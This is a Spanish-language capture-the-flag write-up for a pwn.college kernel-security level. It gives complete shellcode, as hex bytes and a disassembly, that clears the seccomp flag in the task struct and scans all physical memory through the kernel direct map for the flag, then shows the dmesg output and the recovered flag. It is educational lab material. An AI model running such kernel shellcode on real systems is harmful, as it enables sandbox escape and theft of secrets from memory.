# level 12

Una vez más el módulo simplemente acepta shellcode por medio de `device_write` y debemos interactuar con él mediante el programa en espacio de usuario que nos dan. En el programa de espacio de usuario la única diferencia es que ahora el proceso hijo muere despúes de leer la flag:
```C
void load_flag(void)

{
  __pid_t _Var1;
  int __fd;
  
  puts("Attempting to load the flag into memory.\n");
  _Var1 = fork();
  if (_Var1 != 0) {
    wait((void *)0x0);
    return;
  }
  __fd = open("/flag",0);
  if (__fd < 0) {
    exit(1);
  }
  read(__fd,flag.23549,0x100);
  close(__fd);
  exit(0);  // <----
}
```

Retomando el proyecto anterior de leer toda la memoria física por medio del mapeo de memoria del kernel. En x64, cuando se usa paginación de 4 niveles se usa esta región para mapeo directo:
```
ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
```

El shellcode que intenté usar en el nivel anterior fallaba por una cosa: estaba usando `CALL rel32` en lugar de `CALL r/m64` a `printk`, lo que provocaba un error.

<img width="230" height="300" alt="bocchi-the-rock-bocchi" src="https://github.com/user-attachments/assets/d3715577-311d-4a1a-a491-b12cb635e142" />

---

En fin, la solución al reto es leer toda la memoria física del sistema buscando el patrón de la flag:
```
hacker@vm_kernel-security~level12-0:~$ free
               total        used        free      shared  buff/cache   available
Mem:         2029520       41576     1998304           0       14532     1987944
Swap:              0           0           0
hacker@vm_kernel-security~level12-0:~$ printf "0x%x\n" `echo $((0xffff888000000000 + 2029520*1024))`
0xffff88807bdf4000
```

```
hacker@vm_kernel-security~level12-0:~$ echo -ne "\xe8\x80\x00\x00\x00\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x48\x31\xc0\x48\xb8\x00\x00\x00\x00\x80\x88\xff\xff\x48\xbb\x00\x40\xdf\x7b\x80\x88\xff\xff\x48\xb9\x70\x77\x6e\x2e\x63\x6f\x6c\x6c\x48\x39\xd8\x73\x2d\x48\x8b\x10\x48\x39\xca\x74\x06\x48\x83\xc0\x01\xeb\xed\x50\x53\x51\x52\x48\x8d\x3d\x15\x00\x00\x00\x48\x8b\x74\x24\x18\x48\xc7\xc3\xa9\x69\x0b\x81\xff\xd3\x5a\x59\x5b\x58\xeb\xdb\xc3\x4d\x65\x6d\x6f\x72\x79\x20\x49\x6e\x73\x70\x65\x63\x74\x69\x6f\x6e\x20\x4c\x6f\x67\x20\x40\x20\x25\x73\x0a\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xbf\x03\x00\x00\x00\x5e\xba\x80\x00\x00\x00\xb0\x01\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05" | /challenge/babykernel_level12.0
###
### Welcome to /challenge/babykernel_level12.0!
###

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Attempting to load the flag into memory.

The flag has been deleted!

Opened `/proc/pwncollege` on fd 3.

Mapped 0x1000 bytes for shellcode at 0x31337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000031337000 | e8 80 00 00 00                                | call 0x31337085
0x0000000031337005 | 65 48 8b 04 25 00 5d 01 00                    | mov rax, qword ptr gs:[0x15d00]
0x000000003133700e | 48 81 20 ff fe ff ff                          | and qword ptr [rax], 0xfffffffffffffeff
0x0000000031337015 | 48 31 c0                                      | xor rax, rax
0x0000000031337018 | 48 b8 00 00 00 00 80 88 ff ff                 | movabs rax, 0xffff888000000000
0x0000000031337022 | 48 bb 00 40 df 7b 80 88 ff ff                 | movabs rbx, 0xffff88807bdf4000
0x000000003133702c | 48 b9 70 77 6e 2e 63 6f 6c 6c                 | movabs rcx, 0x6c6c6f632e6e7770
0x0000000031337036 | 48 39 d8                                      | cmp rax, rbx
0x0000000031337039 | 73 2d                                         | jae 0x31337068
0x000000003133703b | 48 8b 10                                      | mov rdx, qword ptr [rax]
0x000000003133703e | 48 39 ca                                      | cmp rdx, rcx
0x0000000031337041 | 74 06                                         | je 0x31337049
0x0000000031337043 | 48 83 c0 01                                   | add rax, 1
0x0000000031337047 | eb ed                                         | jmp 0x31337036
0x0000000031337049 | 50                                            | push rax
0x000000003133704a | 53                                            | push rbx
0x000000003133704b | 51                                            | push rcx
0x000000003133704c | 52                                            | push rdx
0x000000003133704d | 48 8d 3d 15 00 00 00                          | lea rdi, [rip + 0x15]
0x0000000031337054 | 48 8b 74 24 18                                | mov rsi, qword ptr [rsp + 0x18]
0x0000000031337059 | 48 c7 c3 a9 69 0b 81                          | mov rbx, 0xffffffff810b69a9
0x0000000031337060 | ff d3                                         | call rbx
0x0000000031337062 | 5a                                            | pop rdx
0x0000000031337063 | 59                                            | pop rcx
0x0000000031337064 | 5b                                            | pop rbx
0x0000000031337065 | 58                                            | pop rax
0x0000000031337066 | eb db                                         | jmp 0x31337043
0x0000000031337068 | c3                                            | ret 
0x0000000031337069 | 4d 65 6d                                      | insd dword ptr [rdi], dx
0x000000003133706c | 6f                                            | outsd dx, dword ptr [rsi]
0x000000003133706d | 72 79                                         | jb 0x313370e8
0x000000003133706f | 20 49 6e                                      | and byte ptr [rcx + 0x6e], cl
0x0000000031337072 | 73 70                                         | jae 0x313370e4

Restricting system calls (default: allow).

Allowing syscall: write (number 1).
Executing shellcode!
hacker@vm_kernel-security~level12-0:~$ dmesg | tail -15
               argo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
               /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[   96.718157] Memory Inspection Log @ pwn.college{0wqGhLrUhdOlhEoV7iX-Me0TEKH.dVDN0wCNwYzM5EzW}
               [   88.270270] 
               argo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
               /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
               

[   96.728793] Memory Inspection Log @ pwn.college/vm/init nokaslr PATH=/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
[   96.734809] Memory Inspection Log @ pwn.college/vm/init nokaslr PATH=/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\x9fKl
[   96.740957] Memory Inspection Log @ pwn.college/vm/init as init processKQ\xf4\x80
[   96.750066] Memory Inspection Log @ pwn.collH9\xd8s-H\x8b\x10H9\xcat\x06H\x83\xc0\x01\xeb\xedPSQRH\x8d=\x15
[   99.339989] Memory Inspection Log @ pwn.collH9\xd8s-H\x8b\x10H9\xcat\x06H\x83\xc0\x01\xeb\xedPSQRH\x8d=\x15
[   99.355297] [device_release] inode=ffff88807c984a48, file=ffff88807c5fbd00
```

`pwn.college{0wqGhLrUhdOlhEoV7iX-Me0TEKH.dVDN0wCNwYzM5EzW}`
